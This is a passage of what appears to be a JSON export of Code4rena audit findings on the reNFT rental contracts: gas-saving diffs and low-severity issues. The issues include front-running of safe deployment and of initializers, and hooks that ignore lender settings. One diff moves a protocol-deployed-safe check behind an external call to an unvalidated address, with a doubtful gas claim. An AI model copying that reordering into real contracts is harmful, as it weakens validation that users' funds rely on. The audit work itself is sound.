a/src/policies/Create.sol b/src/policies/Create.sol\nindex 061180d..d0eb13a 100644\n--- a/src/policies/Create.sol\n+++ b/src/policies/Create.sol\n@@ -645,15 +645,17 @@ contract Create is Policy, Signer, Zone, Accumulator {\n      * @param safe  Address of the potential protocol-deployed rental safe.\n      */\n     function _isValidSafeOwner(address owner, address safe) internal view {\n-        // Make sure only protocol-deployed safes can rent.\n-        if (STORE.deployedSafes(safe) == 0) {\n-            revert Errors.CreatePolicy_InvalidRentalSafe(safe);\n-        }\n\n         // Make sure the fulfiller is the owner of the recipient rental safe.\n         if (!ISafe(safe).isOwner(owner)) {\n             revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe);\n         }\n+\n+        // Make sure only protocol-deployed safes can rent.\n+        if (STORE.deployedSafes(safe) == 0) {\n+            revert Errors.CreatePolicy_InvalidRentalSafe(safe);\n+        }\n+\n     }\n```\n```\nEstimated gas saved: 2100\n```\n\n</details>\n\n2. ### Move `if (data.length < 4) {revert Errors.GuardPolicy_FunctionSelectorRequired()}` to the top of the function.\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L324-#L331\n\nIn the `checkTransaction()` function as shown below the if-revert statement `if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {revert Errors.GuardPolicy_UnauthorizedDelegateCall(to)}` is more gas consumimg than the if-revert statement `if (data.length < 4) {revert Errors.GuardPolicy_FunctionSelectorRequired()}` as the former reads from state and makes an external call which would cost at least `2200` gas units. We can make the \n`checkTransaction()` function more gas efficient by moving the cheaper if-revert statement `if (data.length < 4) {revert Errors.GuardPolicy_FunctionSelectorRequired()}` to the top of the function so that in scenarios where the cheaper revert statement fails the function would revert without having to read from state and make an external call which would be  expensive. The diff below shows how the code could be refactored:\n\n<details>\n\n```solidity\nfile: src/policies/Guard.sol\n\n309:    function checkTransaction(\n310:        address to,\n311:        uint256 value,\n312:        bytes memory data,\n313:        Enum.Operation operation,\n314:        uint256,\n315:        uint256,\n316:        uint256,\n317:        address,\n318:        address payable,\n319:        bytes memory,\n320:        address\n321:    ) external override {\n322:        // Disallow transactions that use delegate call, unless explicitly\n323:        // permitted by the protocol.\n324:        if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {\n325:            revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);\n326:        }\n327:\n328:        // Require that a function selector exists.\n329:        if (data.length < 4) {   //@audit move check to function top\n330:            revert Errors.GuardPolicy_FunctionSelectorRequired();\n331:        }\n.\n.\n.\n345:    }\n```\n```diff\ndiff --git a/src/policies/Guard.sol b/src/policies/Guard.sol\nindex a0a565a..b8d25f9 100644\n--- a/src/policies/Guard.sol\n+++ b/src/policies/Guard.sol\n@@ -319,16 +319,19 @@ contract Guard is Policy, BaseGuard {\n         bytes memory,\n         address\n     ) external override {\n+\n+        // Require that a function selector exists.\n+        if (data.length < 4) {\n+            revert Errors.GuardPolicy_FunctionSelectorRequired();\n+        }\n+\n         // Disallow transactions that use delegate call, unless explicitly\n         // permitted by the protocol.\n         if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {\n             revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);\n         }\n\n-        // Require that a function selector exists.\n-        if (data.length < 4) {\n-            revert Errors.GuardPolicy_FunctionSelectorRequired();\n-        }\n+\n\n         // Fetch the hook to interact with for this transaction.\n         address hook = STORE.contractToHook(to);\n```\n```\nEstimated gas saved: 2200 gas units\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30552",
      "title": "[G-02]  Pre-calculate equations which contain only constant values in constructor",
      "impact": "GAS",
      "content": "For equations, calcuations and computations that only involve constants or immutable values they could be calculated in the contract's constructor and saved to an immutable variable. Using the immutable variable would be cheaper than performing the calculation every time the function is called.\n\n### 3 Instances\n\n1. ### Save `toKeycode(\"STORE\")` computation to an Immutable variable\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L48-#L49\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L73\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L77\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L80-#L81\n\n\nThe free function `toKeycode()` converts a `bytes5` value into a `Keycode` type and returns the `Keycode` value. Calling `toKeycode()` on a constant `bytes5` value would always return the same `Keycode` value therefore calling `toKeycode(\"STORE\")` would always result in the same value. So  having to call `toKeycode(\"STORE\")` multiple times in the `configureDependencies()` and `requestPermissions()` functions isn't gas efficient rather we should make the call in the constructor then save the returned value to an immutable variable then the immutable variable be used in place of `toKeycode(\"STORE\")` in functions that invokes it. The diff below shows howthe code should be refactored:\n\n<details>\n\n```solidity\nfile: src/policies/Admin.sol\n\n40:    function configureDependencies()\n41:        external\n42:        override\n43:        onlyKernel\n44:        returns (Keycode[] memory dependencies)\n45:    {\n46:        dependencies = new Keycode[](2);\n47:\n48:        dependencies[0] = toKeycode(\"STORE\");  //@audit toKeycode(\"STORE\")\n49:        STORE = Storage(getModuleAddress(toKeycode(\"STORE\")));  //@audit toKeycode(\"STORE\")\n50:\n51:        dependencies[1] = toKeycode(\"ESCRW\");\n52:        ESCRW = PaymentEscrow(getModuleAddress(toKeycode(\"ESCRW\")));\n53:    }\n.\n.\n.\n64:    function requestPermissions()\n65:        external\n66:        view\n67:        override\n68:        onlyKernel\n69:        returns (Permissions[] memory requests)\n70:    {\n71:        requests = new Permissions[](8);\n72:        requests[0] = Permissions(\n73:            toKeycode(\"STORE\"),  //@audit toKeycode(\"STORE\")\n74:            STORE.toggleWhitelistExtension.selector\n75:        );\n76:        requests[1] = Permissions(\n77:            toKeycode(\"STORE\"),  //@audit toKeycode(\"STORE\")\n78:            STORE.toggleWhitelistDelegate.selector\n79:        );\n80:        requests[2] = Permissions(toKeycode(\"STORE\"), STORE.upgrade.selector);  //@audit toKeycode(\"STORE\")\n81:        requests[3] = Permissions(toKeycode(\"STORE\"), STORE.freeze.selector);  //@audit toKeycode(\"STORE\")\n82:\n83:        requests[4] = Permissions(toKeycode(\"ESCRW\"), ESCRW.skim.selector);\n84:        requests[5] = Permissions(toKeycode(\"ESCRW\"), ESCRW.setFee.selector);\n85:        requests[6] = Permissions(toKeycode(\"ESCRW\"), ESCRW.upgrade.selector);\n86:        requests[7] = Permissions(toKeycode(\"ESCRW\"), ESCRW.freeze.selector);\n87:    }\n```\n```diff\ndiff --git a/src/policies/Admin.sol b/src/policies/Admin.sol                                \nindex b37d47f..d19a99c 100644                                                               \n--- a/src/policies/Admin.sol                                                                \n+++ b/src/policies/Admin.sol                                                                \n@@ -20,13 +20,16 @@ contract Admin is Policy {                                              \n     // Modules that the policy depends on.                                                 \n     Storage public STORE;                                                                  \n     PaymentEscrow public ESCRW;                                                            \n+    Keycode immutable storeKeycode;                                                        \n                                                                                            \n     /**                                                                                    \n      * @dev Instantiate this contract as a policy.                                         \n      *                                                                                     \n      * @param kernel_ Address of the kernel contract.                                      \n      */                                                                                    \n-    constructor(Kernel kernel_) Policy(kernel_) {}                                         \n+    constructor(Kernel kernel_) Policy(kernel_) {                                          \n+        storeKeycode = toKeycode(\"STORE\");                                                 \n+    }                                                                                      \n                                                                                            \n     /**                                                                                    \n      * @notice Upon policy activation, configures the modules that the policy depends on.  \n@@ -45,8 +48,8 @@ contract Admin is Policy {                                                \n     {                                                                                      \n         dependencies = new Keycode[](2);                                                   \n                                                                                            \n-        dependencies[0] = toKeycode(\"STORE\");                                              \n-        STORE = Storage(getModuleAddress(toKeycode(\"STORE\")));                             \n+        dependencies[0] = storeKeycode;                                                    \n+        STORE = Storage(getModuleAddress(storeKeycode));                                   \n                                                                                            \n         dependencies[1] = toKeycode(\"ESCRW\");                                              \n         ESCRW = PaymentEscrow(getModuleAddress(toKeycode(\"ESCRW\")));                       \n@@ -70,15 +73,15 @@ contract Admin is Policy {                                              \n     {                                                                                      \n         requests = new Permissions[](8);                                                   \n         requests[0] = Permissions(                                                         \n-            toKeycode(\"STORE\"),                                                            \n+            storeKeycode,                                                                  \n             STORE.toggleWhitelistExtension.selector                                        \n         );                                                                                 \n         requests[1] = Permissions(                                                         \n-            toKeycode(\"STORE\"),                                                            \n+            storeKeycode,\n             STORE.toggleWhitelistDelegate.selector\n         );\n-        requests[2] = Permissions(toKeycode(\"STORE\"), STORE.upgrade.selector);\n-        requests[3] = Permissions(toKeycode(\"STORE\"), STORE.freeze.selector);\n+        requests[2] = Permissions(storeKeycode, STORE.upgrade.selector);\n+        requests[3] = Permissions(storeKeycode, STORE.freeze.selector);\n\n         requests[4] = Permissions(toKeycode(\"ESCRW\"), ESCRW.skim.selector);\n         requests[5] = Permissions(toKeycode(\"ESCRW\"), ESCRW.setFee.selector);\n```\n\n</details>\n\n### Apply the same changes to these Instances in the `Create`, `Factory`, `Guard` and `Stop` Contracts.\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L80-#L81\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L104\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L81-#L82\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L102\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L71-#L72\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L92-#L93\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L71-#L72\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L95-#L96\n\n2. ### Save `toKeycode(\"ESCRW\")` computation to an Immutable variable\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L51-#L52\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L83-#L86\n\nThe free function `toKeycode()` converts a `bytes5` value into a `Keycode` type and returns the `Keycode` value. Calling `toKeycode()` on a constant `bytes5` value would always return the same `Keycode` value therefore calling `toKeycode(\"ESCRW\")` would always result in the same value. So  having to call `toKeycode(\"ESCRW\")` multiple times in the `configureDependencies()` and `requestPermissions()` functions isn't gas efficient rather we should make the call in the constructor then save the returned value to an immutable variable then the immutable variable be used in place of `toKeycode(\"ESCRW\")` in functions that invokes it. The diff below shows howthe code should be refactored:\n\n<Details>\n\n```solidity\nfile: src/policies/Admin.sol\n\n40:    function configureDependencies()\n41:        external\n42:        override\n43:        onlyKernel\n44:        returns (Keycode[] memory dependencies)\n45:    {\n46:        dependencies = new Keycode[](2);\n47:\n48:        dependencies[0] = toKeycode(\"STORE\");  \n49:        STORE = Storage(getModuleAddress(toKeycode(\"STORE\")));\n50:\n51:        dependencies[1] = toKeycode(\"ESCRW\");    //@audit toKeycode(\"ESCRW\")\n52:        ESCRW = PaymentEscrow(getModuleAddress(toKeycode(\"ESCRW\"))); //@audit toKeycode(\"ESCRW\")\n53:    }\n.\n.\n.\n64:    function requestPermissions()\n65:        external\n66:        view\n67:        override\n68:        onlyKernel\n69:        returns (Permissions[] memory requests)\n70:    {\n71:        requests = new Permissions[](8);\n72:        requests[0] = Permissions(\n73:            toKeycode(\"STORE\"),\n74:            STORE.toggleWhitelistExtension.selector\n75:        );\n76:        requests[1] = Permissions(\n77:            toKeycode(\"STORE\"),\n78:            STORE.toggleWhitelistDelegate.selector\n79:        );\n80:        requests[2] = Permissions(toKeycode(\"STORE\"), STORE.upgrade.selector);\n81:        requests[3] = Permissions(toKeycode(\"STORE\"), STORE.freeze.selector);\n82:\n83:        requests[4] = Permissions(toKeycode(\"ESCRW\"), ESCRW.skim.selector);  //@audit toKeycode(\"ESCRW\")\n84:        requests[5] = Permissions(toKeycode(\"ESCRW\"), ESCRW.setFee.selector);  //@audit toKeycode(\"ESCRW\")\n85:        requests[6] = Permissions(toKeycode(\"ESCRW\"), ESCRW.upgrade.selector);  //@audit toKeycode(\"ESCRW\")\n86:        requests[7] = Permissions(toKeycode(\"ESCRW\"), ESCRW.freeze.selector);  //@audit toKeycode(\"ESCRW\")\n87:    }\n```\n```diff\ndiff --git a/src/policies/Admin.sol b/src/policies/Admin.sol\nindex b37d47f..d2ae37b 100644\n--- a/src/policies/Admin.sol\n+++ b/src/policies/Admin.sol\n@@ -20,13 +20,15 @@ contract Admin is Policy {\n     // Modules that the policy depends on.\n     Storage public STORE;\n     PaymentEscrow public ESCRW;\n-\n+    Keycode immutable escrwKeycode;\n     /**\n      * @dev Instantiate this contract as a policy.\n      *\n      * @param kernel_ Address of the kernel contract.\n      */\n-    constructor(Kernel kernel_) Policy(kernel_) {}\n+    constructor(Kernel kernel_) Policy(kernel_) {\n+        escrwKeycode = toKeycode(\"ESCRW\");\n+    }\n\n     /**\n      * @notice Upon policy activation, configures the modules that the policy depends on.\n@@ -48,8 +50,8 @@ contract Admin is Policy {\n         dependencies[0] = toKeycode(\"STORE\");\n         STORE = Storage(getModuleAddress(toKeycode(\"STORE\")));\n\n-        dependencies[1] = toKeycode(\"ESCRW\");\n-        ESCRW = PaymentEscrow(getModuleAddress(toKeycode(\"ESCRW\")));\n+        dependencies[1] = escrwKeycode;\n+        ESCRW = PaymentEscrow(getModuleAddress(escrwKeycode));\n     }\n\n     /**\n@@ -80,10 +82,10 @@ contract Admin is Policy {\n         requests[2] = Permissions(toKeycode(\"STORE\"), STORE.upgrade.selector);\n         requests[3] = Permissions(toKeycode(\"STORE\"), STORE.freeze.selector);\n\n-        requests[4] = Permissions(toKeycode(\"ESCRW\"), ESCRW.skim.selector);\n-        requests[5] = Permissions(toKeycode(\"ESCRW\"), ESCRW.setFee.selector);\n-        requests[6] = Permissions(toKeycode(\"ESCRW\"), ESCRW.upgrade.selector);\n-        requests[7] = Permissions(toKeycode(\"ESCRW\"), ESCRW.freeze.selector);\n+        requests[4] = Permissions(escrwKeycode, ESCRW.skim.selector);\n+        requests[5] = Permissions(escrwKeycode, ESCRW.setFee.selector);\n+        requests[6] = Permissions(escrwKeycode, ESCRW.upgrade.selector);\n+        requests[7] = Permissions(escrwKeycode, ESCRW.freeze.selector);\n     }\n```\n</details>\n\n### Apply the same changes to these Instances in the `Create` and `Stop` Contracts.\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L83-#L84\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L105\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L74-#L75\n\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L97-#L98\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30551",
      "title": "[G-01] Avoid Reading and writing to state if amount is zero",
      "impact": "GAS",
      "content": "\n### 4 Instances\n\n1. ### Refactor `PaymentEscrow._decreaseDeposit()` to avoid state read/write if `amount` is zero\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L294\n\nIn the `PaymentEscrow._decreaseDeposit()` function as shown below checks should be implemented to avoid  reading and writing to state if the `amount` argument is zero this is because if `amount` is 0 the statement `balanceOf[token] -= amount` would not change the value of `spenderAllowance` since its being decremented by zero. This then means that in scenarios where `amount` is 0 the statement `balanceOf[token] -= amount` is re-assigning the same value to state i.e there is no state change. Also its important to note that the `_settlePayment()` function that invokes this function does note implement this check before the invocation. The diff below shows how the function should be refactored:\n\n<details>\n\n```solidity\nfile: src/modules/PaymentEscrow.sol\n\n292:    function _decreaseDeposit(address token, uint256 amount) internal {\n293:        // Directly decrease the synced balance.\n294:        balanceOf[token] -= amount;\n295:    }\n```\n```diff\ndiff --git a/src/modules/PaymentEscrow.sol b/src/modules/PaymentEscrow.sol\nindex 34c4f4c..d90f184 100644\n--- a/src/modules/PaymentEscrow.sol\n+++ b/src/modules/PaymentEscrow.sol\n@@ -291,7 +291,10 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {\n      */\n     function _decreaseDeposit(address token, uint256 amount) internal {\n         // Directly decrease the synced balance.\n-        balanceOf[token] -= amount;\n+        if (amount > 0){\n+            balanceOf[token] -= amount;\n+        }\n+\n     }\n```\n```\nEstimated gas saved: 5000 gas units\n```\n</details>\n\n2. ### Refactor `Storage.addRentals()` to avoid state read/write if `asset.amount` is zero\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L201\n\nIn the `Storage.addRentals()` function as shown below checks should be implemented to avoid reading and writing to state if the value of  `asset.amount` is zero this is because if `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] += asset.amount` would not change the value of `rentedAssets[asset.rentalId]` since its being incremented by zero. This then means that in scenarios where `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] += asset.amount` is re-assigning the same value to state i.e there is no state change. The diff below shows how the function should be refactored:\n\n<details>\n\n```solidity\nfile: src/modules/Storage.sol\n\n189:    function addRentals(\n190:        bytes32 orderHash,\n191:        RentalAssetUpdate[] memory rentalAssetUpdates\n192:    ) external onlyByProxy permissioned {\n193:        // Add the order to storage.\n194:        orders[orderHash] = true;\n195:\n196:        // Add the rented items to storage.\n197:        for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {\n198:            RentalAssetUpdate memory asset = rentalAssetUpdates[i];\n199:\n200:            // Update the order hash for that item.\n201:            rentedAssets[asset.rentalId] += asset.amount;\n202:        }\n203:    }\n```\n```diff\ndiff --git a/src/modules/Storage.sol b/src/modules/Storage.sol\nindex 1e46bcb..b909f41 100644\n--- a/src/modules/Storage.sol\n+++ b/src/modules/Storage.sol\n@@ -198,7 +198,10 @@ contract Storage is Proxiable, Module, StorageBase {\n             RentalAssetUpdate memory asset = rentalAssetUpdates[i];\n\n             // Update the order hash for that item.\n-            rentedAssets[asset.rentalId] += asset.amount;\n+            if (asset.amount > 0) {\n+                rentedAssets[asset.rentalId] += asset.amount;\n+            }\n+\n         }\n     }\n```\n```\nEstimated gas saved: 5000 gas units\n```\n</details>\n\n3. ### Refactor `Storage.removeRentals()` to avoid state read/write if `asset.amount` is zero\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L233\n\nIn the `Storage.removeRentals()` function as shown below checks should be implemented to avoid reading and writing to state if the value of  `asset.amount` is zero this is because if `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] -= asset.amount` would not change the value of `rentedAssets[asset.rentalId]` since its being decremented by zero. This then means that in scenarios where `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] -= asset.amount` is re-assigning the same value to state i.e there is no state change. The diff below shows how the function should be refactored:\n\n<details>\n\n```solidity\nfile: src/modules/Storage.sol\n\n216:    function removeRentals(\n217:        bytes32 orderHash,\n218:        RentalAssetUpdate[] calldata rentalAssetUpdates\n219:    ) external onlyByProxy permissioned {\n220:        // The order must exist to be deleted.\n221:        if (!orders[orderHash]) {\n222:            revert Errors.StorageModule_OrderDoesNotExist(orderHash);\n223:        } else {\n224:            // Delete the order from storage.\n225:            delete orders[orderHash];\n226:        }\n227:\n228:        // Process each rental asset.\n229:        for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {\n230:            RentalAssetUpdate memory asset = rentalAssetUpdates[i];\n231:\n232:            // Reduce the amount of tokens for the particular rental ID.\n233:            rentedAssets[asset.rentalId] -= asset.amount;\n234:        }\n235:    }\n```\n```diff\ndiff --git a/src/modules/Storage.sol b/src/modules/Storage.sol\nindex 1e46bcb..b8f2248 100644\n--- a/src/modules/Storage.sol\n+++ b/src/modules/Storage.sol\n@@ -230,7 +230,10 @@ contract Storage is Proxiable, Module, StorageBase {\n             RentalAssetUpdate memory asset = rentalAssetUpdates[i];\n\n             // Reduce the amount of tokens for the particular rental ID.\n-            rentedAssets[asset.rentalId] -= asset.amount;\n+            if (asset.amount > 0) {\n+                rentedAssets[asset.rentalId] -= asset.amount;\n+            }\n+\n         }\n     }\n```\n```\nEstimated gas saved: 5000 gas units\n```\n</details>\n\n4. ### Refactor `Storage.removeRentalsBatch()` to avoid state read/write if `asset.amount` is zero\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L264\n\nIn the `Storage.removeRentalsBatch()` function as shown below checks should be implemented to avoid reading and writing to state if the value of  `asset.amount` is zero this is because if `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] -= asset.amount` would not change the value of `rentedAssets[asset.rentalId]` since its being decremented by zero. This then means that in scenarios where `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] -= asset.amount` is re-assigning the same value to state i.e there is no state change. The diff below shows how the function should be refactored:\n\n<details>\n\n```solidity\nfile: src/modules/Storage.sol\n\n244:    function removeRentalsBatch(\n245:        bytes32[] calldata orderHashes,\n246:        RentalAssetUpdate[] calldata rentalAssetUpdates\n247:    ) external onlyByProxy permissioned {\n248:        // Delete the orders from storage.\n249:        for (uint256 i = 0; i < orderHashes.length; ++i) {\n250:            // The order must exist to be deleted.\n251:            if (!orders[orderHashes[i]]) {\n252:                revert Errors.StorageModule_OrderDoesNotExist(orderHashes[i]);\n253:            } else {\n254:                // Delete the order from storage.\n255:                delete orders[orderHashes[i]];\n256:            }\n257:        }\n258:\n259:        // Process each rental asset.\n260:        for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {\n261:            RentalAssetUpdate memory asset = rentalAssetUpdates[i];\n262:\n263:            // Reduce the amount of tokens for the particular rental ID.\n264:            rentedAssets[asset.rentalId] -= asset.amount;\n265:        }\n266:    }\n```\n```diff\ndiff --git a/src/modules/Storage.sol b/src/modules/Storage.sol\nindex 1e46bcb..677656c 100644\n--- a/src/modules/Storage.sol\n+++ b/src/modules/Storage.sol\n@@ -261,7 +261,10 @@ contract Storage is Proxiable, Module, StorageBase {\n             RentalAssetUpdate memory asset = rentalAssetUpdates[i];\n\n             // Reduce the amount of tokens for the particular rental ID.\n-            rentedAssets[asset.rentalId] -= asset.amount;\n+            if (asset.amount > 0) {\n+                rentedAssets[asset.rentalId] -= asset.amount;\n+            }\n+\n         }\n```\n```\nEstimated gas saved: 5000 gas units\n```\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30550",
      "title": "[R-01] - `Accumulator._insert()` might result in memory collision in future code",
      "impact": "LOW",
      "content": "This function expands the size of the `rentalAssets` memory variable, assuming there's no memory that's currently used afterwards.\nThis is true under current code, but worth keeping an eye on it for future code changes or upgrades - if there's another memory variable after `rentalAssets` when this function is called it'd override it, causing severe issues.\n\n[Code](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Accumulator.sol#L81-L83)\n```solidity\n            // Update the free memory pointer so that memory is safe\n            // once we stop doing dynamic memory array inserts\n            mstore(0x40, add(newItemPosition, 0x40))\n```\n\n**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/330#issuecomment-1908959716):**\n > L1- Acknowledged.<br>\n> L2- Acknowledged.<br>\n> L3- Disputed, this is expected behavior.<br>\n> L4- Confirmed.<br>\n> L5- Acknowledged, hook implementations considered out of scope.<br>\n> L6- Disputed, policies can only be enabled or disabled. in this instance, a second stop policy would be created for users to opt-in to.<br>\n> \n> R1- Acknowleged.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30549",
      "title": "[L-06] - If stop policy is replaced it’d brick the rental stop for older safes",
      "impact": "LOW",
      "content": "The stop policy can be replaced via the kernel, if the old stop policy is disabled it'd be impossible to stop the rentals - since only the old stop policy has access to the safe.\n\nAs mitigation - either keep the old stop policy active, or add some migration mechanism (allowing the old stop policy to add the new stop policy to the safe as a module. This has to be done before deploying the current stop policy).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30548",
      "title": "[L-05] - Can’t update the status of a self destructed hook",
      "impact": "LOW",
      "content": "\nThe protocol doesn't allow updating the status of hooks with no code.\nThe issue is that if a hook is self destructed for any reason the admin can't update its status any more.\n\n[code](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L318-L319)\n```solidity\n        if (hook.code.length == 0) revert Errors.StorageModule_NotContract(hook);\n```\n\nAs mitigation - if the hook doesn't have any code allow only disabling it (setting the status to zero).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30547",
      "title": "[L-04] - Limit the rental to a reasonable time, to prevent creating for an unreasonable time by mistake",
      "impact": "LOW",
      "content": "Currently it seems that the protocol allows rental for thousands of years, that doesn’t make much sense and if a user specifies that by mistake that might lock their tokens forever.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30546",
      "title": "[L-03] - On transaction hooks aren’t controlled by the lender",
      "impact": "LOW",
      "content": "Contrary to the docs [which state](https://github.com/code-423n4/2024-01-renft/blob/main/docs/hooks.md#:~:text=When%20signing%20a%20rental%20order%2C%20the%20lender%20can%20decide%20to%20include%20an%20array%20of%20Hook%20structs%20along%20with%20it.%20These%20are%20bespoke%20restrictions%20or%20added%20functionality%20that%20can%20be%20applied%20to%20the%20rented%20token%20within%20the%20wallet.) that the hooks are controlled by the lender - in reality all active on-transaction hooks run regardless of what the lender has specified in the order.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30545",
      "title": "[L-02] - Initializer can be front run",
      "impact": "LOW",
      "content": "Both modules are using a proxy with initializers, those initializers can be front run during deployment.\nAs mitigation - ensure that initialization runs at the same tx with deployment.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30544",
      "title": "[L-01] - `Factory.deployRentalSafe()` can be front-run to revert safe creation",
      "impact": "LOW",
      "content": "\nConsider the following scenario:\n* A user sends out a tx to call `Factory.deployRentalSafe()`\n* The attacker sees that and front runs it, calling `SafeProxyFactory.createProxyWithNonce()` directly with the same parameters\n* The user's tx would revert because the safe already exists\n\nThe user can mitigate that by first creating a safe with a different set or order of owners, or a different threshold, and then creating the safe they wished to create (the attacker can still keep front-running those txs though).\n\nA way to mitigate that (prevent front running) is to deploy a fork of `SafeProxyFactory` with access control - allowing only the protocol's Factory to create new safes.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30543",
      "title": "[M-16] Blacklisted extensions can't be disabled for rental safes",
      "impact": "MEDIUM",
